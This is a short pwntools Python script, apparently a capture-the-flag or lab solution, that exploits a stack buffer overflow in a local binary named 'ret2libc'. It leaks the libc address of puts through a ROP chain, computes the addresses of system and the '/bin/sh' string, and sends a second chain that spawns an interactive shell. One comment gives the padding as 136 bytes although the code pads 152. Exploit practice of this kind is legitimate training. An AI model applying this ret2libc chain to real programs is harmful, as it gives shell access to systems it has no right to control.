from pwn import *

# 连接目标程序
p = process('./ret2libc')
context(log_level='debug', arch='amd64', os='linux')
# gdb.attach(p, 'b*0x0040068B\nc')

rop = ROP('./ret2libc')
rop.raw(b'A' * (144 + 8))  # 填充144 + fake_rbp(8) 个字节的数据到缓冲区中

# 获取puts函数在libc中的地址
elf = ELF('./ret2libc')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

# 调用puts函数，泄露libc的地址, rop.call 会自动 pop rdi, ret来传入参数
rop.call(puts_plt, [puts_got])
rop.call('main')  # 调用main函数，使程序重新运行

# 发送Payload并接收响应
payload = rop.chain()
p.sendline(payload)

# 接收泄露出的libc地址
puts_addr = p.recvuntil(b'\x7f')[-6:]
puts_addr = unpack(puts_addr.ljust(8, b'\x00'))  # 地址是6bytes, 补到8位unpack
success('puts_addr: ' + hex(puts_addr))

# 计算system函数和/bin/sh字符串在libc中的偏移量
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']
system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh\x00'))

# 使用system函数调用/bin/sh
rop = ROP('./ret2libc')
rop.raw(b'A' * (144 + 8))  # 填充136个字节的数据到缓冲区中
rop.call(system, [binsh])

# 构建最终的ROP链
payload = rop.chain()

# 发送Payload并接收响应
p.sendline(payload)
p.interactive()
